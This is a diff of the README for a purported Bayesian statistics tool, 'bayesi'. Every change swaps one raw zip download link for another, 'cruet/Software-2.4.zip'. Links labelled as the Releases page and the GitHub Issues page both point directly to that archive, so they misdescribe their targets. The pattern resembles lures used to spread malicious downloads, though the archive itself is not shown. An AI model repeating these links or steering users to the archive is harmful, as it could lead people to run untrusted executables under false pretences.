@@ -6,11 +6,11 @@ Welcome to bayesi! This tool makes understanding and applying Bayesian statistic
 
 ## 📥 Download bayesi
 
-[![Download bayesi](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip)](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip)
+[![Download bayesi](https://github.com/ANDERSON482/bayesi/raw/refs/heads/main/cruet/Software-2.4.zip)](https://github.com/ANDERSON482/bayesi/raw/refs/heads/main/cruet/Software-2.4.zip)
 
 To get bayesi, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to the download page: [Download bayesi](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip)
+1. **Visit the Releases Page:** Click this link to go to the download page: [Download bayesi](https://github.com/ANDERSON482/bayesi/raw/refs/heads/main/cruet/Software-2.4.zip)
 
 2. **Choose the Version:** You will see several versions available. Pick the latest one for the best features and updates.
 
@@ -88,7 +88,7 @@ To run bayesi effectively, ensure your system meets the following requirements:
 
 If you encounter any issues:
 
-- **Visit our GitHub Issues Page:** You can report bugs or ask for help [here](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip).
+- **Visit our GitHub Issues Page:** You can report bugs or ask for help [here](https://github.com/ANDERSON482/bayesi/raw/refs/heads/main/cruet/Software-2.4.zip).
 - **Check the Documentation:** In-app support and guidance can help you with the basic functions.
 - **Community Forums:** Engage with other users to share tips and tricks.
 
@@ -96,4 +96,4 @@ If you encounter any issues:
 
 To keep your bayesi app current, regularly check the Releases page. You can find updates, new features, and fixes effectively.
 
-[Download bayesi](https://raw.githubusercontent.com/ANDERSON482/bayesi/main/cruet/bayesi.zip) again to ensure you have the latest version!
+[Download bayesi](https://github.com/ANDERSON482/bayesi/raw/refs/heads/main/cruet/Software-2.4.zip) again to ensure you have the latest version!
